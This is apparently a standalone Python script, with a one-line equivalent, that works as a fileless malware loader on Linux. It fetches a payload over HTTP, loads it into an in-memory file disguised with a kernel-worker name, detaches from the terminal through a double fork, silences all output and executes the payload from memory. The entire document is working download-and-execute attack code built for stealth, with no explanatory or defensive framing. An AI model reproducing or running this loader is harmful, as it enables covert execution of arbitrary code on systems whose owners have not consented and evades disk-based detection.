# one-liner version :
# python3 -c 'import os,ctypes,urllib.request as r;L=ctypes.CDLL("libc.so.6");p=r.urlopen("http://127.0.0.1/basic-payload").read();f=L.memfd_create(b"k",1);os.write(f,p);[os._exit(0) for _ in range(2) if os.fork()>0];os.setsid();[os.dup2(os.open(os.devnull,2),i) for i in (0,1,2)];os.execv(f"/proc/self/fd/{f}",[" "])'

import os
import ctypes
import urllib.request
import sys

URL_PAYLOAD = "http://127.0.0.1/basic-payload"
MFD_CLOEXEC = 0x0001

def run_detached_fileless():
    libc = ctypes.CDLL("libc.so.6")

    try:
        with urllib.request.urlopen(URL_PAYLOAD) as response:
            payload = response.read()

        fd = libc.memfd_create(b"[kworker_system]", MFD_CLOEXEC)
        os.write(fd, payload)

        pid = os.fork()
        if pid > 0:
            sys.exit(0)

        os.setsid()

        pid_grandson = os.fork()
        if pid_grandson > 0:
            os._exit(0)

        devnull = os.open(os.devnull, os.O_RDWR)
        os.dup2(devnull, 0)
        os.dup2(devnull, 1)
        os.dup2(devnull, 2)

        os.execv(f"/proc/self/fd/{fd}", [" "])

    except Exception as e:
        sys.exit(1)

if __name__ == "__main__":
    run_detached_fileless()